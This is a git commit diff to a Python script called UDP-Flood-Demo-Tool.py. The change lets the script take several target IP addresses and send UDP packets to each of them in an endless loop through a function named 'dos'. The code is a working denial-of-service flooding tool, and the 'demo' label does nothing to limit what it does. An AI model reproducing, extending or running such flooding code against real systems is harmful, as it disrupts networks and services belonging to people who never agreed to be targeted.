25632d35a6e6afef8ffafcdea6e76982dff8c77a
ahmad-rami-bit <ahamdrami45@gmail.com>
2025-08-07 20:38:10 +0200

    Update UDP-Flood-Demo-Tool.py
    Implementing multi-IP targeting functionality

--- UDP-Flood-Demo-Tool.py
+++ UDP-Flood-Demo-Tool.py
@@ -2,16 +2,22 @@ from socket import *
 import random 
 import time
 
-ip=input("Enter the target ip: ")
+listInputs=int(input("Specify how many IPs to target for flooding: "))
+ip=[]
+for x in range(listInputs):
+    value=input("Enter the element value: ")    #e.g:192.168.1.1
+    ip.append(value)
 port=int(input("Enter the port number:  "))
-delay=int(input('Specify the delay duration (manage the flooding [0-0.99]): '))
+delay=int(input("Specify the delay duration (manage the flooding [0-0.99]): "))
 
 def dos(ip,port,delay):
     counter=0
     while True:
         
         for i in range(0,1000):
-            dosSocket.sendto(payload,(ip,port))
+            for x in range(listInputs):
+                dosSocket.sendto(payload,(ip[x],port))
+
         print("packet num %s the ip %s the port %s" %(counter,ip,port) )
         counter=counter+1000
         time.sleep(delay)
